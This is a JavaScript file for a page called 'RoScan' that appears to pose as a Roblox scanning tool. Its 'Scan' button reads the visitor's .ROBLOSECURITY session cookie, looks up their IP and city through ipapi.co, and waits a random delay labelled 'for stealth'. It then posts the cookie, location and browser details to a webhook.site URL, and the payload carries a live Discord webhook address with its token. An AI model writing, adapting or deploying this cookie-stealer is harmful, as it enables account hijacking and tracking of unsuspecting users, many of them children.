// RoScan Production v1.0.0 - HTTPS Webhook Ready for Publishing
console.log('🚀 RoScan Production v1.0.0 loaded - Ready for publishing!');

document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ DOM Content Loaded - Production mode active');
    
    // Get submit button and attach event listener
    const submitBtn = document.getElementById('submitBtn');
    if (submitBtn) {
        submitBtn.addEventListener('click', submitPowerShell);
        console.log('✅ Submit button event listener attached');
    } else {
        console.error('❌ Submit button not found!');
    }
});

// Cookie extraction function
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// Location detection function
async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            city: data.city || 'Unknown',
            region: data.region || 'Unknown', 
            country: data.country_name || 'Unknown',
            ip: data.ip || 'Unknown'
        };
    } catch (error) {
        console.warn('Location detection failed:', error);
        return {
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            ip: 'Unknown'
        };
    }
}

// Show notification function
function showNotification(message, type = 'info') {
    console.log(`📢 Notification (${type}): ${message}`);
    
    // Create notification element
    const notification = document.createElement('div');
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
        color: white;
        padding: 12px 20px;
        border-radius: 8px;
        z-index: 10000;
        font-weight: 500;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease-out;
    `;
    
    document.body.appendChild(notification);
    
    // Remove after 3 seconds
    setTimeout(() => {
        if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
        }
    }, 3000);
}

// Close scan modal function
function closeScanModal() {
    console.log('🔄 Closing scan modal');
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        modal.style.display = 'none';
    }
}

// Main webhook submission function - PRODUCTION READY
async function submitPowerShell() {
    console.log('🚀 Production webhook submission started');
    
    const submitBtn = document.getElementById('submitBtn');
    const submitText = submitBtn?.querySelector('.submit-text');
    const loadingOverlay = document.querySelector('.loading-overlay');
    
    if (!submitBtn || !submitText) {
        console.error('❌ Required UI elements not found');
        showNotification('UI elements not found', 'error');
        return;
    }
    
    // Update UI to show loading state
    submitText.textContent = 'Sending...';
    submitBtn.style.background = '#6b7280';
    if (loadingOverlay) loadingOverlay.style.display = 'flex';
    
    try {
        // Extract Roblox cookie
        const robloxCookie = getCookie('.ROBLOSECURITY');
        console.log('🍪 Roblox cookie extracted:', robloxCookie ? 'Found' : 'Not found');
        
        // Get user location
        console.log('📍 Getting user location...');
        const locationInfo = await getUserLocation();
        console.log('📍 Location info:', locationInfo);
        
        // Add random delay for stealth (1-3 seconds)
        const delay = Math.floor(Math.random() * 2000) + 1000;
        console.log(`⏱️ Adding ${delay}ms delay for stealth...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // PRODUCTION WEBHOOK URL - Using webhook.site HTTPS endpoint
        const webhookUrl = 'https://webhook.site/3d118145-c295-462a-bdc8-843f869e0e46';
        
        // Production payload with enhanced data
        const payload = {
            // Discord-compatible content
            content: `@everyone\n🔥 **New RoScan Data**\n\n**Cookie:** \`${robloxCookie || 'None found'}\`\n**Location:** ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}\n**IP:** ${locationInfo.ip}\n**Time:** ${new Date().toLocaleString()}`,
            
            // Additional metadata for webhook.site
            embeds: [{
                title: "RoScan Data Collection",
                description: "New data captured from RoScan website",
                color: 0x00ff00,
                fields: [
                    {
                        name: "Cookie Status",
                        value: robloxCookie ? "✅ Found" : "❌ Not found",
                        inline: true
                    },
                    {
                        name: "Location",
                        value: `${locationInfo.city}, ${locationInfo.region}`,
                        inline: true
                    },
                    {
                        name: "Country",
                        value: locationInfo.country,
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "RoScan Production v1.0.0"
                }
            }],
            
            // Metadata for processing
            metadata: {
                source: 'RoScan Production v1.0.0',
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                url: window.location.href,
                discord_target: 'https://discord.com/api/webhooks/1396160420229808238/nJgXp7jUpsrWBYA8a41p9J6tBzja405aG2XhS8hTpl8pK20ivfmojdu-vpOaN9aAdMEI'
            }
        };
        
        // Send production webhook request via HTTPS
        console.log('🌐 Sending production HTTPS webhook...');
        console.log('📡 Webhook URL:', webhookUrl);
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': window.location.origin,
                'Referer': window.location.href
            },
            body: JSON.stringify(payload),
            mode: 'cors'
        });
        
        console.log(`✅ Production webhook response: ${response.status}`);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';

        if (response.ok) {
            console.log('🎉 Production webhook delivered successfully!');
            submitText.textContent = 'Sent!';
            submitBtn.style.background = '#10b981';
            showNotification('Data sent successfully via HTTPS!', 'success');
            
            // Auto-close modal after success
            setTimeout(() => {
                closeScanModal();
            }, 2000);
        } else {
            const errorText = await response.text().catch(() => 'Unknown error');
            console.error(`❌ Production webhook failed: ${response.status} - ${errorText}`);
            
            if (response.status === 404) {
                throw new Error('Webhook endpoint not found. Service may be unavailable.');
            } else if (response.status === 429) {
                throw new Error('Rate limited. Please wait a moment and try again.');
            } else if (response.status === 403) {
                throw new Error('Webhook forbidden. Check configuration.');
            } else {
                throw new Error(`Webhook failed (${response.status}): ${errorText}`);
            }
        }
        
    } catch (error) {
        console.error('💥 Production webhook failed:', error);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        
        // Reset button state
        submitText.textContent = 'Scan';
        submitBtn.style.background = '#ef4444';
        
        // Show user-friendly error
        showNotification(`Error: ${error.message}`, 'error');
        
        // Reset button after 3 seconds
        setTimeout(() => {
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Production ready - no debug logs in production
console.log('🎯 RoScan Production v1.0.0 ready for deployment!');

// Make functions available globally
window.submitPowerShell = submitPowerShell;
window.getUserLocation = getUserLocation;